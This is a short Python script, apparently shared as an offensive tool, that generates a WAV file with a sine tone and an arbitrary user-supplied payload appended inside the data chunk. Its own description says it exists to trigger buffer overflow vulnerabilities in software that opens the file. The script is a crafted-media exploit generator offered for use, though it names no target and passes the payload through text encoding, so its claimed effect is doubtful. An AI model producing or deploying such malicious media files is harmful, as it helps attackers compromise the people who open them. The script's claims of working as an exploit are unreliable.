import wave
import struct
import argparse
import math

def create_exploit_wav(output_file, payload):
    num_channels = 1
    sample_width = 2
    frame_rate = 44100
    num_frames = 1000

    audio_data = [int(32767.0 * 0.5 * math.sin(2.0 * math.pi * 440.0 * x / frame_rate)) for x in range(num_frames)]
    audio_data_bytes = struct.pack('<' + 'h' * len(audio_data), *audio_data)

    header = b'RIFF'
    header += struct.pack('<I', 36 + len(audio_data_bytes) + len(payload)) 
    header += b'WAVE'
    header += b'fmt '
    header += struct.pack('<I', 16) 
    header += struct.pack('<H', 1) 
    header += struct.pack('<H', num_channels) 
    header += struct.pack('<I', frame_rate) 
    header += struct.pack('<I', frame_rate * num_channels * sample_width) 
    header += struct.pack('<H', num_channels * sample_width) 
    header += struct.pack('<H', sample_width * 8) 
    header += b'data'
    header += struct.pack('<I', len(audio_data_bytes) + len(payload)) 

    exploit_data = audio_data_bytes + payload.encode()

    with open(output_file, 'wb') as f:
        f.write(header)
        f.write(exploit_data)

    print(f"Exploit WAV file created: {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a WAV file with an exploit payload to trigger buffer overflow vulnerabilities.")
    parser.add_argument("output", help="Path to the output WAV file.")
    parser.add_argument("payload", help="Payload to inject into the WAV file.")
    args = parser.parse_args()

    create_exploit_wav(args.output, args.payload)

# Crediti a Jashin L.
